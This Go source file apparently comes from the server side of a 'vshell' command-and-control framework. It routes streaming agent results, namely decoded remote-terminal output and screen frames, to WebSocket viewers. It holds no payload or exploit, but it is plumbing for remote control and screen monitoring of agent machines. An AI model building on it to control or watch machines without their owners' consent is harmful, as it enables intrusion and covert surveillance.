// Package controllers/result_forward 将 Agent 的流式结果转发给对应的 WebSocket 查看者
// （终端输出与屏幕帧）。
// Package controllers/result_forward forwards streaming agent results to the
// matching WebSocket viewers (terminal output and screen frames).
package controllers

import (
	"encoding/base64"
	"strings"

	"vshell/c2engine"
)

// init 注册结果转发钩子：监听器的结果处理器无法导入 controllers（避免循环导入），
// 因此通过 init 时注册的钩子把流式结果委托到这里。
func init() {
	// The listener's result handler cannot import controllers (import cycle),
	// so it delegates streaming results here via a hook registered at init.
	c2engine.SetResultForwardHook(forwardStreamingResultToViewers)
}

// forwardStreamingResultToViewers 将实时 Agent 结果路由到匹配的 WebSocket 查看者：
//   - "terminal_output:<base64>" → 该客户端的远程终端会话
//   - "screen_frame:<format>:<index>:<base64>" → 该客户端的屏幕查看者
// forwardStreamingResultToViewers routes live agent results to the matching
// WebSocket viewers:
//   - "terminal_output:<base64>" → the remote terminal session(s) for the client
//   - "screen_frame:<format>:<index>:<base64>" → the screen viewer for the client
func forwardStreamingResultToViewers(clientID int64, result string) {
	switch {
	case strings.HasPrefix(result, "terminal_output:"):
		data, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(result, "terminal_output:"))
		if err != nil {
			return
		}
		forwardTerminalOutput(clientID, data)
	case strings.HasPrefix(result, "screen_frame:"):
		handleScreenFrame(clientID, result)
	}
}

// forwardTerminalOutput 将终端输出发送给绑定到指定客户端的每个远程终端 WebSocket 会话。
// forwardTerminalOutput sends terminal output to every remote-terminal
// WebSocket session bound to the given client.
func forwardTerminalOutput(clientID int64, data []byte) {
	wsTermMu.RLock()
	var targets []*WSTerminalSession
	for _, ts := range wsTermSessions {
		if ts.ClientID == clientID {
			targets = append(targets, ts)
		}
	}
	wsTermMu.RUnlock()

	for _, ts := range targets {
		ts.sendOutput(data)
	}
}
